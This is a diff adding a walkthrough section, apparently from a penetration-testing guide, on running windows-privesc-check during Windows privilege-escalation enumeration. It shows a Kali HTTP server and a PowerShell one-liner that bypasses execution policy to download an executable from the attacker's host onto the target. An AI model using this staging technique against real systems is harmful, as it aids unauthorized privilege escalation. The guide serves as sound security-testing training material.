@@ -188,6 +188,40 @@ We are also going to look a a few automated methods of performing Windows Enumer
 * Watson
 * JAWZ
 
+### Running Windows Privesc Check (windows-privesc-check)
+The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation.  It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in.  Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!
+
+First we will need to clone the latest version to our environment:
+```bash
+root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check
+Cloning into 'windows-privesc-check'...
+remote: Enumerating objects: 1232, done.
+remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232
+Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done.
+Resolving deltas: 100% (897/897), done.
+```
+Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
+```bash
+root@kali:~/tools# cd windows-privesc-check/
+root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Now we will need to transfer the file to our remote windows box:
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");
+```
+And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+```
+C:\Users\Admin>cd ..
+C:\Users>cd Public
+C:\Users\Public>cd Downloads
+C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
+```
+The windows-privesc-check will create a detailed HTML report and text based report for your review.
+
+
+
 ### Running Sherlock
 Sherlock is a powershell library with a number of privledge escalation checkers built in. 
 We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.  
